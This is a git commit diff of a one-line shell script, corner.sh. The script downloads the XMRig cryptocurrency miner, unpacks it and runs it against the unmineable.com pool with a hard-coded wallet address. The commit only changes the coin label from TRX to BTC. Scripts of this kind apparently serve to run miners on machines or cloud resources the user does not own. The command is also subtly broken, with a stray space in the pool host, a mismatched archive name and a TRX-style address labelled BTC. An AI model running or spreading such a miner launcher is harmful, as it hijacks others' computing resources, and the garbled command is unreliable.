dfaadbb09c390dff9c38fcd607aab15a4e4bc94a
xmodes <150797408+xmodes@users.noreply.github.com>
2023-11-14 17:44:27 +0300

    corner.sh

--- corner.sh
+++ corner.sh
@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0 && ./xmrig -o rx. unmineable.com:3333 -a rx -k -u TRX: TALFCwj7GajwwmctVsLXdeeDAJKa67sj4d.drpunch.001 -p x
+wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0 && ./xmrig -o rx. unmineable.com:3333 -a rx -k -u BTC: TALFCwj7GajwwmctVsLXdeeDAJKa67sj4d.drpunch.001 -p x
